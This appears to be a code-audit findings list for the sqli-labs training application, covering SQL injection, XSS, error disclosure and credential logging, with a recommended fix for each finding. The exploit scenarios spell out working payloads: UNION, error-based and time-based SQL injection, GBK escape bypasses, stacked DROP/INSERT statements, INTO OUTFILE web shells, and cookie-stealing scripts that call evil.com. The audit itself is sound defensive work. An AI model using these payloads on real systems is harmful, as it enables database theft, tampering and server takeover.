findings.title: Reflected XSS via unsanitized output of user input in hint text
findings.description: Lines 94-95 echo `$uname` and `$passwd` directly into the HTML response without HTML encoding. These variables are derived from user POST input (lines 37-39) and passed through `addslashes()` (lines 51-52), which only escapes single quotes, double quotes, backslashes, and NUL bytes — none of which prevent HTML/JavaScript injection. Any HTML tags in the input pass through untouched. When the form is submitted, the reflected values render in the page context.
findings.exploit_scenario: An attacker sends a POST request with `uname=<script>alert(document.cookie)</script>`. The addslashes() call does not modify the angle brackets or script tags. Line 94 renders: `Hint: The Username you input is escaped as : <script>alert(document.cookie)</script>`, executing arbitrary JavaScript in the victim's browser. This could be weaponized via a self-submitting form to steal session cookies.
findings.recommendation: Apply `htmlspecialchars($uname, ENT_QUOTES, 'UTF-8')` before echoing user-controlled data into HTML. Apply the same treatment to `$passwd`.

findings.title: SQL error details disclosed to user via mysql_error()
findings.description: Line 83 calls `print_r(mysql_error())` which outputs the full MySQL error message — including the malformed query text — directly into the HTML response when a query fails. This provides an attacker with the exact query structure (table names, column names, WHERE clause layout), enabling precise refinement of SQL injection payloads. Combined with the GBK bypass in F-34-01, this transforms a blind injection opportunity into a trivially exploitable error-based injection.
findings.exploit_scenario: During SQL injection exploitation (e.g., via the GBK charset bypass), an attacker sends deliberately malformed injected payloads. The MySQL error message on line 83 reveals the exact query structure and database schema, allowing the attacker to iteratively craft a UNION-based injection to extract all data from the database.
findings.recommendation: Remove or replace `print_r(mysql_error())` with a generic error message for production use. Log detailed errors server-side only.

findings.title: SQL injection via GBK multibyte charset bypass of mysql_real_escape_string
findings.description: Untrusted input arrives via `$_GET['id']` (line 29) and is passed through `check_quotes()`, which calls `mysql_real_escape_string()` (line 22). However, on line 39, `mysql_query("SET NAMES gbk")` switches the MySQL connection charset to GBK — a multibyte encoding. Because `mysql_real_escape_string` escapes `'` to `\'` (bytes `0x5c 0x27`), an attacker can supply a leading byte such as `0xbf` before the quote. After escaping, the sequence becomes `0xbf 0x5c 0x27`. In GBK, `0xbf 0x5c` is a single valid character (縗), causing `0x27` (the quote) to be interpreted as an unescaped SQL string delimiter. The injected value is interpolated directly into the SQL query on line 40: `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`.
findings.exploit_scenario: An attacker sends GET request: `?id=%bf%27 UNION SELECT 1,username,password FROM users -- `. The `%bf%27` becomes `0xbf 0x27` in raw bytes. `mysql_real_escape_string` produces `0xbf 0x5c 0x27`. With GBK charset, MySQL parses `0xbf5c` as one character, leaving the raw `'` (0x27) to break out of the string literal, enabling full UNION-based SQL injection and data exfiltration.
findings.recommendation: Use `mysql_set_charset('gbk')` (or the mysqli/PDO equivalent) BEFORE calling `mysql_real_escape_string`, so the escape function is charset-aware. Better yet, use prepared statements with parameterized queries (PDO or mysqli) which are immune to this class of bypass regardless of charset.

findings.title: Reflected XSS via unsanitized $id echoed in HTML response
findings.description:
On line 76, the value of `$id` — derived from `$_GET['id']` — is echoed directly into the HTML output: `echo "Hint: The Query String you input is escaped as : ".$id ."
";`. Although `$id` passed through `mysql_real_escape_string` (which escapes SQL metacharacters like quotes and backslashes), it does NOT sanitize HTML metacharacters such as `<`, `>`, `"`, or JavaScript event handlers. An attacker-controlled GET parameter is rendered in the page without HTML entity encoding.
findings.exploit_scenario: An attacker crafts a URL: `Less-36.php?id=<script>alert(document.cookie)</script>`. The value passes through `mysql_real_escape_string` unchanged (no SQL metacharacters present), then is echoed verbatim into the HTML body at line 76, executing arbitrary JavaScript in the victim's browser context. This can be used for session hijacking or phishing.
findings.recommendation: HTML-encode `$id` before output using `htmlspecialchars($id, ENT_QUOTES, 'UTF-8')`, or apply output encoding at the template/view layer.

findings.title: Unauthenticated stacked SQL injection via GET id parameter
findings.description: The GET parameter `id` is read without any sanitization or type casting (line ~29: `$id=$_GET['id'];`) and directly interpolated into a SQL query string on line 41: `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`. This query is then executed via `mysqli_multi_query()` (line 43), which natively supports executing multiple semicolon-separated SQL statements (stacked queries). There is no authentication required to reach this code path. Error output on line 66 (`print_r(mysqli_error($con1))`) provides feedback that aids blind exploitation. The user input is also written to a log file (lines 32-34) with no sanitization.
findings.exploit_scenario: An attacker sends a GET request such as: `GET /Less-38.php?id=1'; INSERT INTO users VALUES (100,'hacker','pwned') -- `. The `mysqli_multi_query` call executes both the original SELECT and the attacker's INSERT statement, allowing full database manipulation including data exfiltration, modification, or destruction (e.g., DROP TABLE, UPDATE credentials, INSERT admin users). Because the MySQL user has been granted the FILE privilege in sqli-labs setups, `LOAD_FILE()` and `INTO OUTFILE` could also be chained for potential remote code execution.
findings.recommendation: Use parameterized queries via `mysqli_prepare()` and `mysqli_stmt_bind_param()` instead of string interpolation. Replace `mysqli_multi_query()` with `mysqli_query()` unless multiple statements are explicitly required. Additionally, cast `$id` to an integer with `intval()` as a defense-in-depth measure.

findings.title: SQL injection via GBK multibyte charset bypass of mysql_real_escape_string
findings.description: The code calls mysql_real_escape_string() on user input at lines 53-54, THEN issues mysql_query("SET NAMES gbk") at line 59, and finally interpolates the "escaped" values into a SQL query at line 60. mysql_real_escape_string() escapes `'` by prepending `\` (0x5c). In GBK encoding, certain lead bytes (e.g., 0xbf) consume 0x5c as a valid trail byte, forming a single multibyte character. Because the escape function ran before the connection charset was changed to GBK, it is unaware of these multibyte sequences. The server then parses the query under GBK, consuming the backslash as part of a multibyte character and leaving the injected single quote active. The full data flow: $_POST['uname'] (line 42) → mysql_real_escape_string (line 53) → string interpolation into SQL (line 60) after SET NAMES gbk (line 59). The same path exists for $_POST['passwd'].
findings.exploit_scenario: An attacker sends a POST request with uname=%bf%27 OR 1=1 -- and an arbitrary passwd. mysql_real_escape_string converts this to 0xbf0x5c0x270x20... which, under GBK, the server interprets as [GBK-char] [unescaped-quote] OR 1=1 --, bypassing authentication entirely and returning all rows from the users table.
findings.recommendation: Use mysql_set_charset('gbk') instead of mysql_query("SET NAMES gbk") so that mysql_real_escape_string() is aware of the connection charset during escaping. Better yet, migrate to PDO or mysqli with prepared statements (parameterized queries) which are immune to charset-based bypasses.

findings.title: Sensitive credentials logged to plaintext file before escaping
findings.description: At lines 49-51, the raw (unescaped) username and password from $_POST are written directly to result.txt via fwrite(). This occurs before any escaping or validation. If this file is accessible via the web server or shared filesystem, any party who can read it obtains all submitted credentials. The data flow: $_POST['uname'] and $_POST['passwd'] (lines 42-43) → fwrite to result.txt (lines 49-51).
findings.exploit_scenario: An attacker who can read result.txt (e.g., via a path traversal or local file inclusion in another component, or because the file is web-accessible) harvests all usernames and passwords submitted to this login form.
findings.recommendation: Remove the credential logging, or at minimum hash/redact passwords before writing and ensure the file is stored outside the web root with strict filesystem permissions.

findings.title: Stored XSS via database values echoed without HTML encoding
findings.description: At lines 76-78, values read from the database ($row['username'] and $row['password']) are echoed directly into HTML without htmlspecialchars() or equivalent encoding. Since the SQL injection in F-37-01 allows an attacker to control which rows are returned (or insert data), an attacker can store HTML/JavaScript in the database that executes when rendered in the victim's browser.
findings.exploit_scenario: An attacker exploits the SQL injection to insert a crafted username containing <script>document.location='http://evil.com/steal?c='+document.cookie</script> into the users table. When an admin or user views the page and the injected row is returned, the script executes in their browser, stealing session cookies.
findings.recommendation: Apply htmlspecialchars() with ENT_QUOTES to all database values before echoing them in HTML output. Fix the underlying SQL injection to prevent arbitrary data injection.

findings.title: Unauthenticated stacked SQL injection via integer-type id parameter
findings.description: On line 46, `$id` is read directly from `$_GET['id']` with no sanitization, casting, or parameterization. On line 60, it is interpolated into a SQL query string: `$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`. Because `$id` is not enclosed in quotes (integer-type), an attacker need not escape any delimiters. The query is executed via `mysqli_multi_query()` (line 62), which supports stacked queries, allowing an attacker to append arbitrary SQL statements (e.g., INSERT, UPDATE, DELETE, DROP) separated by semicolons.
findings.exploit_scenario: An attacker sends a GET request to `Less-39.php?id=1; INSERT INTO users (username,password) VALUES ('attacker','pass') --`. The `mysqli_multi_query()` call executes both the original SELECT and the injected INSERT, granting the attacker persistent database access. Alternatively, `id=1; DROP TABLE users` destroys data, or `id=0 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables` exfiltrates schema information.
findings.recommendation: Use parameterized queries with prepared statements. Replace the string interpolation with: `$stmt = mysqli_prepare($con1, "SELECT * FROM users WHERE id=? LIMIT 0,1"); mysqli_stmt_bind_param($stmt, "i", $id);`. Additionally, avoid `mysqli_multi_query()` unless stacked queries are genuinely required, and cast `$id = intval($_GET['id'])` as a defense-in-depth measure.

findings.title: Unauthenticated stacked SQL injection via id GET parameter
findings.description: The value of `$_GET['id']` is taken at line 28 (`$id=$_GET['id']`) with no sanitization or parameterization and interpolated directly into a SQL query string at line 50: `$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";`. This query is then executed with `mysqli_multi_query()` at line 52, which supports executing multiple semicolon-separated SQL statements in a single call. The wrapping `('$id')` is trivially closed with a payload prefix of `')`. No authentication or authorization checks exist before the query is executed.
findings.exploit_scenario: An attacker sends a GET request such as: `GET /Less-40.php?id=')%3B DROP TABLE users-- -`. This closes the parenthesized string literal and terminates the first SELECT, then executes a second statement (DROP TABLE). More practically, an attacker could exfiltrate data via blind techniques (since errors are suppressed with `error_reporting(0)`) or modify/insert data: `GET /Less-40.php?id=')%3B INSERT INTO users VALUES (99,'hacked','password')-- -`. Because `mysqli_multi_query` is used, any SQL statement can be stacked after the initial SELECT.
findings.recommendation: Use prepared statements with parameterized queries instead of string interpolation. Replace the direct concatenation with `mysqli_prepare($con1, "SELECT * FROM users WHERE id=(?) LIMIT 0,1")` followed by `mysqli_stmt_bind_param()` and `mysqli_stmt_execute()`. Additionally, if stacked queries are not required, use `mysqli_query()` instead of `mysqli_multi_query()` to limit the damage of any injection.

findings.title: Unparameterized SQL query with user-controlled GET parameter wrapped in double quotes and parentheses
findings.description: The value of `$_GET['id']` (line ~20) flows directly into the SQL query string with no sanitization or parameterization. The code wraps the input in double quotes (line 23: `$id = '"' . $id . '"'`) and places it inside parentheses in the WHERE clause (line 24). This produces a query of the form `SELECT * FROM users WHERE id=("$USER_INPUT") LIMIT 0,1`. An attacker can close the double-quote and parenthesis with `")` and then append arbitrary SQL. The error output on line 35 (`print_r(mysql_error())`) further aids exploitation by revealing database error messages.
findings.exploit_scenario: An attacker sends a GET request to `Less-4.php?id=1") UNION SELECT 1,username,password FROM users -- `. This closes the double-quote and parenthesis, appends a UNION SELECT to extract all usernames and passwords from the database, and comments out the trailing LIMIT clause. The application directly displays the queried data on lines 28-32, giving the attacker full read access to the users table. Error-based or UNION-based exfiltration of any database data is possible.
findings.recommendation: Use parameterized/prepared statements instead of string concatenation to build SQL queries. Replace `mysql_query` (deprecated) with PDO or mysqli prepared statements, binding `$_GET['id']` as a parameter. Additionally, validate that `id` is a numeric value before using it in the query.

findings.title: Reflected XSS via database values echoed without HTML encoding
findings.description: On lines 28-30, `$row['username']` and `$row['password']` are echoed directly into HTML with no output encoding (`htmlspecialchars`). If an attacker can insert crafted content into the database (e.g., via the SQL injection in F-04-01 to INSERT/UPDATE rows), a victim viewing the page with an `id` parameter pointing to the poisoned row would execute attacker-controlled JavaScript in their browser context. Additionally, the `mysql_error()` output on line 35 is printed without encoding, which could reflect attacker-controlled fragments from malformed SQL.
findings.exploit_scenario: An attacker uses the SQL injection (F-04-01) to INSERT a user row whose username field contains `<script>document.location='http://evil.com/?c='+document.cookie</script>`. They then trick an authenticated admin into visiting `Less-4.php?id=<injected_row_id>`, which causes the script to execute in the admin's browser, exfiltrating session cookies.
findings.recommendation: Apply `htmlspecialchars()` with `ENT_QUOTES` to all dynamic values before embedding them in HTML output, including `$row['username']`, `$row['password']`, and `mysql_error()` output.

findings.title: Unauthenticated SQL injection via stacked queries in id GET parameter
findings.description:
The `$_GET['id']` value is copied directly into the SQL query string at line 44 without any sanitization, validation, or parameterization:
```
$id=$_GET['id'];          // line 27 — raw user input
...
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";  // line 44 — direct string interpolation
```
The query is then executed with `mysqli_multi_query()` (line 46), which supports stacked (multiple) SQL statements separated by semicolons. Because the input is injected into an unquoted integer context, no quote escaping is needed. `error_reporting(0)` suppresses error messages, making this a blind injection, but `mysqli_multi_query` enables stacked queries so an attacker can execute arbitrary DML (INSERT, UPDATE, DELETE, DROP) and, depending on MySQL file privileges, even `INTO OUTFILE` for RCE.
findings.exploit_scenario: An attacker sends: `GET /Less-41.php?id=1; INSERT INTO users VALUES(99,'hacker','pwned') -- -`. The `mysqli_multi_query` call executes both statements, inserting a new row. More critically, with FILE privilege: `?id=1; SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php' -- -` achieves remote code execution. Data can also be exfiltrated via time-based blind techniques (`IF(condition,SLEEP(5),0)`).

findings.title: Login form submits unsanitized user input to likely SQLi-vulnerable backend (login.php)
findings.description: This file is the entry-point form for Less-43, a "Stacked Query" SQL injection lab. The form at lines 42–64 collects `login_user` (line 50) and `login_password` (line 57) via POST and submits them to `login.php` (line 40, action attribute). The HTML title at line 30 explicitly labels this as a "Stacked Query" exercise (analogous to Less-42). In the sqli-labs pattern, `login.php` constructs SQL queries from these POST parameters without parameterization. The password field is typically not escaped because it is expected to be hashed — enabling stacked-query injection (e.g., `'; CREATE USER ...`). The actual vulnerable sink is in the referenced `login.php`, which was not provided for review, but the data flow and lab identity make this the expected HIGH-severity vulnerability for this focus area.
findings.exploit_scenario: An attacker submits a password value of `'); DROP TABLE users; --` (single-quote, closing parenthesis to match the SQL string wrapping, then a stacked query). If `login.php` constructs something like `SELECT * FROM users WHERE username='$user' AND password='$pass'`, the injected SQL executes. Given this is Less-43 (the parenthesis-quoted variant of Less-42), the expected payload uses closing parenthesis: `'); INSERT INTO users VALUES ('hacker','hacker','admin'); --` to create a backdoor account.
findings.recommendation: Review and report on `login.php` in this same directory — parameterize the SQL query using prepared statements (e.g., mysqli prepared statements or PDO) rather than interpolating `$_POST['login_password']` and `$_POST['login_user']` into the query string.

findings.title: Unescaped variable $form_title_in echoed in HTML context
findings.description: Line 23 echoes `$form_title_in` directly into the HTML output without htmlspecialchars() or equivalent encoding: `<?php echo $form_title_in; ?>`. This variable is not defined in this file — it presumably comes from the included `sql-connect.php` (line 11). If any code path allows attacker control over this variable (e.g., via a global variable pollution, extract(), or the include file itself reading from user input), it would enable reflected or stored XSS. Confidence is low because the variable's origin is not visible in this file.
findings.exploit_scenario: If `$form_title_in` is sourced from user-controllable input (e.g., a cookie or request parameter processed in `sql-connect.php`), an attacker injects `<script>document.location='http://evil.com/?c='+document.cookie</script>`, stealing session cookies of anyone viewing the login page.
findings.recommendation: Apply `htmlspecialchars($form_title_in, ENT_QUOTES, 'UTF-8')` when echoing the variable in HTML context. Verify the provenance of `$form_title_in` in `sql-connect.php`.

findings.title: Unsanitized user input directly interpolated into SQL ORDER BY clause
findings.description: The GET parameter `sort` is read at line 20 (`$id=$_GET['sort'];`) with no sanitization or validation. This value is directly interpolated into a SQL ORDER BY clause at line 26: `$sql = "SELECT * FROM users ORDER BY $id";`. The query is executed at line 27 via `mysql_query($sql)`. Additionally, line 50 prints `mysql_error()` to the response, enabling error-based SQL injection exfiltration.
findings.exploit_scenario: An attacker sends a request such as `GET /Less-46.php?sort=extractvalue(1,concat(0x7e,(SELECT+version())))`. The `extractvalue` error-based injection causes the database version to be returned in the MySQL error message displayed at line 50. Alternatively, time-based blind injection is possible via `?sort=IF(1=1,SLEEP(5),0)`, or boolean-based blind via `?sort=(SELECT IF(SUBSTRING(password,1,1)='a',id,username) FROM users WHERE id=1)`. Any data in the database (including credentials from the `users` table) can be extracted.
findings.recommendation: Use parameterized queries. ORDER BY cannot be parameterized via prepared statements, so the `sort` input should be validated against a strict allowlist of permitted column names (e.g., `['id', 'username', 'password']`). Reject any input not in the allowlist.

findings.title: SQL injection in ORDER BY clause via unsanitized GET parameter 'sort'
findings.description: The value of `$_GET['sort']` is taken directly from user input (line 18) and interpolated into the ORDER BY clause of a SQL query on line 33: `$sql = "SELECT * FROM users ORDER BY '$id'";`. Although the value is wrapped in single quotes, an attacker can break out by supplying a single quote of their own and then append arbitrary SQL. Because `mysql_error()` is printed on line 55 (`print_r(mysql_error());`), error-based SQL injection is straightforward. The deprecated `mysql_*` API does not support parameterized queries, and none are used here.
findings.exploit_scenario: An attacker sends a request such as `GET /Less-47.php?sort=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`. The single quote closes the ORDER BY literal, the subquery triggers a duplicate-key error whose message contains the result of `SELECT user()`, and that error is rendered in the HTTP response via `print_r(mysql_error())`. The attacker can iterate this to extract the entire database — tables, columns, passwords, etc.
findings.recommendation: Use parameterized queries (PDO or mysqli prepared statements). Since ORDER BY clauses do not accept bound parameters for column names, whitelist the allowed sort values (e.g., only permit known column names like 'id', 'username', 'password') and reject any input that does not match. Also switch from the deprecated mysql_* extension to mysqli or PDO.

findings.title: Form submits unsanitized user credentials to login.php enabling stacked-query SQL injection
findings.description: The form on line 26 (action="login.php") sends `login_user` and `login_password` directly via POST to `login.php`. The page title ("Less-45 - Stacked Query Blind based twist") confirms this is a stacked-query SQL injection challenge. The actual SQL sink is in `login.php` where the POST parameters are interpolated into queries. In the sqli-labs pattern for "twist" lessons, the login handler constructs queries like `SELECT * FROM users WHERE username='$user' AND password='$pass'` then executes them with `mysqli_multi_query()`, enabling stacked queries (e.g., `'; CREATE USER ...#`). The review scope is limited to `Less-45.php`; the form is the untrusted-input entry point feeding the vulnerable sink in `login.php`.
findings.exploit_scenario: An attacker submits `login_user` = `admin'; INSERT INTO users VALUES (..., 'attacker', 'pass')#` and `login_password` = `x`. The login.php handler interpolates this into a multi-query call, executing the injected INSERT and creating a backdoor account.
findings.recommendation: Review and patch `login.php` to use prepared statements with parameterized queries. Replace `mysqli_multi_query()` with `mysqli_prepare()` / `mysqli_stmt_bind_param()` so user input is never interpolated into SQL.

findings.title: Reflected output of uninitialized variable $form_title_in
findings.description: On line 31, `<?php echo $form_title_in; ?>` outputs a variable that is never defined in Less-45.php. It presumably comes from the included `sql-connect.php`. If the include file does not initialize it, PHP will emit an empty/undefined value. If an attacker can influence this variable (e.g., via `register_globals` in ancient PHP, or if the include sets it from user data), it is echoed without `htmlspecialchars()` encoding, enabling XSS. Without seeing the include file, confidence is low.
findings.exploit_scenario: If `$form_title_in` were somehow set from a query parameter or cookie, an attacker could inject `<script>document.location='http://evil/?c='+document.cookie</script>` into the page, stealing session cookies of anyone visiting the crafted link.
findings.recommendation: Replace `echo $form_title_in` with `echo htmlspecialchars($form_title_in, ENT_QUOTES, 'UTF-8')`. Ensure the variable is always initialized in the include file.

findings.title: Blind SQL injection via ORDER BY clause — unquoted direct interpolation of $_GET['sort']
findings.description: The value of `$_GET['sort']` is read on line 18 with no sanitization and interpolated directly into a SQL ORDER BY clause on line 21: `$sql = "SELECT * FROM users ORDER BY $id";`. There are no quotes, no casting, no allowlist, and no parameterization. Unlike Less-47 (which wraps the value in single quotes), Less-48 injects the raw value without any delimiter, so the attacker does not even need to break out of a quoted context. The query result is used only to decide whether to render a table (boolean blind) — no query error text is reflected, making this a fully blind ORDER BY injection.
findings.exploit_scenario: An attacker sends a request such as `?sort=IF(1=1,1,2)` and observes that the user table renders normally. Then they send `?sort=IF(1=2,1,2)` and observe a different result ordering or error. By iterating with conditional expressions such as `?sort=IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a',1,2)`, the attacker can extract the entire database one character at a time through boolean inference. Because there are no quotes to escape, even simpler payloads like `?sort=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)` can be used for time-based blind extraction.
findings.recommendation: Whitelist the sort parameter to known column names (e.g., `$allowed = ['id','username','password']; if(!in_array($id, $allowed)) { die('invalid'); }`). Alternatively, cast to integer: `$id = intval($_GET['sort']);`. Do not interpolate raw user input into SQL, even in ORDER BY clauses.

findings.title: Unauthenticated SQL injection via GET parameter 'id' with error-based data exfiltration
findings.description: The user-controlled GET parameter 'id' is read on line 17 (`$id=$_GET['id']`) and directly interpolated into a SQL query string on line 23 (`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`) with no sanitization or parameterization. The query is executed on line 24 via `mysql_query()`. Additionally, on line 33, `print_r(mysql_error())` echoes the full MySQL error to the response, enabling error-based extraction techniques. Because the injection point is inside single-quote delimiters, an attacker closes the string with a single quote and appends arbitrary SQL. The application has no authentication gate — the endpoint is publicly accessible.
findings.exploit_scenario: An attacker sends: GET /Less-5.php?id=1' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT concat_ws(':',username,password) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -. The single quote closes the string literal, the injected subquery triggers a duplicate-key error whose message contains the concatenated username:password from the database, and mysql_error() on line 33 returns that error to the attacker. Iterating through rows exfiltrates all credentials.
findings.recommendation: Use parameterized queries (PDO or mysqli prepared statements) instead of string interpolation. Replace the deprecated mysql_* API with mysqli or PDO. Remove or sanitize database error output in production (do not echo mysql_error() to users).

findings.title: Blind SQL injection via ORDER BY clause using unsanitized GET parameter 'sort'
findings.description: The user-controlled GET parameter `sort` is read on line 15 (`$id=$_GET['sort'];`) with no sanitization or validation. It is interpolated directly into a SQL ORDER BY clause on line 17: `$sql = "SELECT * FROM users ORDER BY '$id'";`. The resulting query is executed on line 18 via `mysql_query($sql)`. Although the value is wrapped in single quotes, an attacker can close the quote and inject arbitrary SQL (e.g., `' -- -`, or time-based blind payloads such as `' AND SLEEP(5)-- -`). No error output is rendered to the user (no `mysql_error()` call), making this a blind injection vector. Successful query execution is distinguishable via response timing or row-order differences, enabling full data extraction.
findings.exploit_scenario: An attacker sends GET request `?sort=1' AND IF(1=1,SLEEP(5),0)-- -`. The single quote closes the string literal in the ORDER BY clause, and the attacker-controlled conditional SLEEP causes a measurable delay, confirming the injection. Iterating through database contents (table names, column values) using boolean or time-based blind techniques allows exfiltration of all data, including credentials stored in the `users` table.
findings.recommendation: Use an allowlist of permitted ORDER BY column names/directions (e.g., only `id ASC`, `id DESC`, `username ASC`, etc.) selected via an integer index. Never interpolate user input into SQL. If dynamic ORDER BY is truly needed, validate the input against a strict whitelist of known column names before use.

findings.title: Reflected XSS via log file output from 'sort' parameter written without encoding
findings.description: On line 16, the raw user input `$id` (sourced from `$_GET['sort']`) is written to `result.txt` via `fwrite($fp,'SORT:'.$id."\n")`. While the file write itself doesn't execute HTML, the file is served with a `.txt` extension which browsers render as plain text (mitigating direct XSS from the file). However, the more actionable stored-XSS path is through the SQL injection in F-49-01: an attacker can use SQL injection to insert or update rows in the `users` table containing HTML/JavaScript. On lines 28-30, database values (`$row['id']`, `$row['username']`, `$row['password']`) are echoed directly into HTML without `htmlspecialchars()` encoding. If the database contains attacker-controlled XSS payloads (achievable via the SQLi), they execute in victims' browsers.
findings.exploit_scenario: An attacker uses the SQL injection (F-49-01) to insert a row into the `users` table with `username` set to `<script>alert(document.cookie)</script>`. When any user views the page listing, the malicious script executes in their browser context, stealing session cookies or performing actions as the victim.
findings.recommendation: Encode all database-derived output with `htmlspecialchars($row['field'], ENT_QUOTES, 'UTF-8')` before echoing into HTML. Separately, fix the SQL injection to prevent unauthorized data manipulation.

findings.title: ORDER BY SQL injection with stacked-query support via mysqli_multi_query
findings.description: Untrusted input from $_GET['sort'] is captured on line 25 ($id=$_GET['sort']) with no sanitization. This value is interpolated directly into a SQL query on line 31: $sql="SELECT * FROM users ORDER BY $id". The query is then executed on line 33 using mysqli_multi_query($con1, $sql), which supports multiple semicolon-separated statements. This allows both ORDER BY injection (e.g., IF() / CASE-based blind extraction) and stacked queries (e.g., INSERT, UPDATE, DELETE, DROP, INTO OUTFILE). Error output on line 64 (mysqli_error) further aids exploitation by disclosing query structure.
findings.exploit_scenario: An attacker sends GET /Less-50.php?sort=1; SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php' -- . Because mysqli_multi_query executes both statements, a web shell is written to disk. Alternatively, for blind data exfiltration: ?sort=IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a',1,(SELECT 1 UNION SELECT 2)).
findings.recommendation: Whitelist the sort parameter to an allowlist of valid column names (e.g., ['id','username','password']) and reject anything else. Never interpolate user input into SQL. If dynamic ORDER BY is needed, use a lookup map: $order = ['id'=>'id','user'=>'username'][$_GET['sort']] ?? 'id'; then concatenate the known-safe value. Avoid mysqli_multi_query unless stacked queries are explicitly required; use mysqli_query instead.

findings.title: Unauthenticated SQL injection with stacked queries via ORDER BY clause
findings.description: The `$_GET['sort']` parameter is read on line 16 (`$id=$_GET['sort']`) and directly interpolated into a SQL query string on line 22 (`$sql="SELECT * FROM users ORDER BY $id"`). There is no sanitization, escaping, or parameterization. The query is then executed on line 24 via `mysqli_multi_query($con1, $sql)`, which explicitly supports stacked queries (multiple statements separated by semicolons). Because `error_reporting(0)` suppresses errors, this is a blind injection scenario, but the stacked-query capability significantly raises the impact.
findings.exploit_scenario: An attacker sends a GET request such as: `?sort=1; INSERT INTO users VALUES (99,'hacker','password') -- -`. Because `mysqli_multi_query` processes both statements, the attacker can insert arbitrary rows, modify existing data, drop tables, or — if the MySQL user has FILE privilege — write a webshell via `SELECT '<?php system($_GET[cmd]) ?>' INTO OUTFILE '/var/www/html/shell.php'`. Data exfiltration is possible through blind techniques (e.g., conditional time-based payloads via BENCHMARK/SLEEP in a stacked query). No authentication is required.
findings.recommendation: Use a whitelist of allowed ORDER BY column values (e.g., only integer values 1–4 or known column names) rather than accepting raw user input. If dynamic ordering is necessary, validate the input strictly against an allowlist before concatenation. Switch from `mysqli_multi_query` to `mysqli_query` unless stacked queries are genuinely required.

findings.title: SQL injection with stacked queries via sort parameter in ORDER BY clause
findings.description: The `$_GET['sort']` value is read on line 16 (`$id=$_GET['sort']`) with no sanitization or parameterization. It is concatenated directly into a SQL string on line 21: `$sql="SELECT * FROM users ORDER BY '$id'"`. Critically, the query is executed via `mysqli_multi_query($con1, $sql)` on line 23, which supports stacked (multiple) SQL statements separated by semicolons. Although the `$id` is wrapped in single quotes, an attacker trivially breaks out with a closing quote and semicolon. Detailed SQL errors are also echoed back to the user on line 52 (`print_r(mysqli_error($con1))`), enabling error-based data exfiltration.
findings.exploit_scenario: An attacker sends: `?sort=1'; INSERT INTO users VALUES(99,'attacker','pwned');--`. The single-quote closes the ORDER BY literal, the semicolon terminates the first statement, and the INSERT executes as a stacked second query via `mysqli_multi_query`. Alternatively, error-based exfiltration: `?sort=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--` to extract credentials via the error message shown on line 52. Any data in the database can be read, modified, or deleted.
findings.recommendation: Use parameterized queries. However, ORDER BY clauses cannot be parameterized with prepared statements, so the `sort` input must be strictly whitelisted against an allow-list of valid column names (e.g., `['id','username','password']`). Additionally, replace `mysqli_multi_query` with `mysqli_query` if stacked queries are not needed, and remove the `mysqli_error` output in production.

findings.title: Potential reflected XSS via unsanitized mysqli_error output
findings.description: On line 52, `print_r(mysqli_error($con1))` dumps the raw MySQL error string directly into the HTML response without HTML encoding. When the injected SQL from the `sort` parameter (line 16) triggers a MySQL error, the error message may include fragments of the attacker-controlled input. If the MySQL error message reflects portions of the malformed query containing HTML/JavaScript, this becomes reflected XSS.
findings.exploit_scenario: An attacker crafts a sort value that causes a MySQL error reflecting the malicious input, e.g., `?sort=1'<script>alert(document.cookie)</script>'`. If the MySQL error message includes the query fragment containing the script tag, it is rendered in the victim's browser, executing arbitrary JavaScript in their session context.
findings.recommendation: HTML-encode all error output with `htmlspecialchars()` before echoing, or suppress database error details entirely in production.

findings.title: Stacked SQL injection via unsanitized sort GET parameter in ORDER BY clause
findings.description: On line 18, `$id` is read directly from `$_GET['sort']` with no sanitization or parameterization. On line 24, it is interpolated into a SQL query: `$sql="SELECT * FROM users ORDER BY '$id'";`. On line 26, this query is executed via `mysqli_multi_query()`, which supports stacked (multiple) SQL statements separated by semicolons. An attacker can close the single quote, terminate the statement with `;`, and append arbitrary SQL (e.g., INSERT, UPDATE, DELETE, DROP), then comment out the remainder.
findings.exploit_scenario: An attacker sends GET request: `?sort=1'; INSERT INTO users VALUES (99,'hacker','pwned') -- `. The mysqli_multi_query call on line 26 executes both the original SELECT and the injected INSERT, allowing the attacker to add an administrative account or exfiltrate/destroy data via stacked queries like UPDATE or DROP TABLE.
findings.recommendation: Use parameterized queries with mysqli_prepare/mysqli_stmt_bind_param. Since ORDER BY clauses cannot use positional placeholders for column names, whitelist the allowed sort values (e.g., only permit numeric column indices 1-3 or known column names). Additionally, switch from mysqli_multi_query to mysqli_query to eliminate stacked query support.

findings.title: Unauthenticated SQL injection via id GET parameter
findings.description: The `$_GET['id']` value is read at line ~58 (`$id=$_GET['id']`) with zero sanitization and directly interpolated into a SQL SELECT statement at line 85: `$sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1";`. The resulting string is passed to `mysql_query()` on the same line. The parentheses around `$id` do not prevent injection; they only require the attacker to close the paren first (e.g., `1) UNION ... -- -`). There is no call to `addslashes`, `mysql_real_escape_string`, `intval`, or parameterized queries on this path. The `else` branch (answer submission via `$_POST['key']`) is properly sanitized with both `addslashes` and `mysql_real_escape_string`, but the primary query is not.
